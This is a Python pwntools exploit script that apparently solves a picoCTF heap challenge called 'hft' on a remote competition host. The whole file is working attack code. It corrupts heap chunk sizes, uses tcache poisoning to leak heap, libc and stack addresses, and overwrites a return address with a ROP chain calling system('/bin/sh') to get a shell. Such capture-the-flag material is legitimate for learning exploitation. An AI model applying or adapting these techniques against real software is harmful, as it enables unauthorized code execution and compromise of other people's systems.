from pwn import *

exe = ELF("./hft")
libc = ELF("./libc.so.6")

HOST = 'tethys.picoctf.net'
PORT = 53741

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

def create_pkt(sz: hex, data: bytes, consume: bool = True):
    io.recvline_contains(b'PKT_RES')
    io.send(p64(sz))
    io.sendline(data)
    if consume:
        io.recvline()

io = start()

# heap base leak
create_pkt(0x10, b'a' * 0x10 + p64(0xd51))
create_pkt(0xd30, b'')
create_pkt(0x10, b'\x01' + b'\x00' * 6, False)
heap_base = unpack(io.recvline().rstrip()[20:26].ljust(8, b'\0')) - 0x2b0
create_pkt(0xd00, b'')
log.info(f'heap_base = {heap_base:#x}')

# tcache (0x20): C -> A
# tcache (0x30): B
# tcache (0x40): D
# unsorted bin: E
# A
# B
# C
# D
# E
create_pkt(0x270, b'a' * 0x270 + p64(0x41))
create_pkt(0xfa0, b'a' * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b'a' * 0xfb0 + p64(0x41))
create_pkt(0xf90, b'a' * 0xf90 + p64(0x61))
create_pkt(0x40, b'a' * 0x40 + p64(0xfb1))
create_pkt(0xf90, b'')

addr_E = heap_base + 0xa9050
addr_C_fd = heap_base + 0x65fd0

# tcache (0x20): C -> E
create_pkt(0x20, b'a' * 0x22008 + p64((addr_C_fd >> 12) ^ addr_E))

# tcache (0x20): E
create_pkt(0x10, b'')

# tcache (0x20): 
# leak libc base
create_pkt(0x10, pack(1)[:7], False)
libc_base = unpack(io.recvline().rstrip()[20:26].ljust(8, b'\0')) - 0x219ce0

# repair E.mchunk_size
create_pkt(0x30, b'a' * 0x210a0 + p64(0xf91)[:7])
create_pkt(0xf80, b'')

libc.address = libc_base
log.info(f'libc_base = {libc_base:#x}')

# tcache (0x20): C -> A
# tcache (0x30): B
# A
# B
# C
create_pkt(0x10, b'a' * 0x10 + p64(0x41))
create_pkt(0xfa0, b'a' * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b'a' * 0xfb0 + p64(0x41))
create_pkt(0x30, b'')

# tcache (0x20): C -> (addr_environ - 0x10)
addr_C_fd = heap_base + 0x10ffd0
addr_environ = libc.sym['environ']
create_pkt(0x20, b'a' * 0x22008 + p64((addr_C_fd >> 12) ^ (addr_environ - 0x10)))

# tcache (0x20): addr_environ - 0x10
create_pkt(0x10, b'')

# tcache (0x20):
payload = create_pkt(0x10, p64(1)[:7], False)
addr_stack_ret_addr = unpack(io.recvline().rstrip()[20:26].ljust(8, b'\0')) - 0x150
log.info(f'addr_stack_ret_addr = {addr_stack_ret_addr:#x}')

# tcache (0x20): C -> A
# tcache (0x30): B
# A
# B
# C
create_pkt(0xf70, b'a' * 0xf70 + p64(0x41))
create_pkt(0xfa0, b'a' * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b'a' * 0xfb0 + p64(0x41))
create_pkt(0x30, b'')

# tcache (0x20): C -> (addr_stack_ret - 0x10)
addr_C_fd = heap_base + 0x175fd0
create_pkt(0x20, b'a' * 0x22008 + p64((addr_C_fd >> 12) ^ (addr_stack_ret_addr - 0x28)))

# tcache (0x20): addr_stack_ret - 0x10
create_pkt(0x10, b'')

# tcache(0x20):
addr_pop_rdi_ret = libc_base + 0x001bc061
addr_bin_sh = libc_base + 0x1d8698
addr_ret = libc_base + 0x1bc062
addr_system = libc.sym['system']

create_pkt(0x10, b'a' * 0x20 + p64(addr_pop_rdi_ret) + p64(addr_bin_sh) + p64(addr_ret) + p64(addr_system), False)
io.interactive()